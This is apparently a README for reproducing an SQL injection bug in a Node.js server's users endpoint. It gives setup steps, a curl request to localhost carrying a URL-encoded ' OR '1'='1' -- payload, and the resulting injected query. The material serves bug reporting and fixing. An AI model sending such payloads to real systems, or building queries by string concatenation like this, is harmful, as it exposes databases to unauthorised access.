# SQL injection reproduction

Use the Node.js version in [.nvmrc](.nvmrc). No database setup or credentials are needed to see the generated SQL.

Install dependencies and start the server:

```sh
nvm install
nvm use
npm i
npm run dev
```

In another terminal, send the injection payload:

```sh
curl "http://localhost:3000/users/123%27%20OR%20%271%27%3D%271%27%20--%20"
```

The server output should include the SQL that would be executed, even if the database connection fails:

```text
query: "SELECT * FROM users WHERE staffNumber = '123' OR '1'='1' -- '"
```
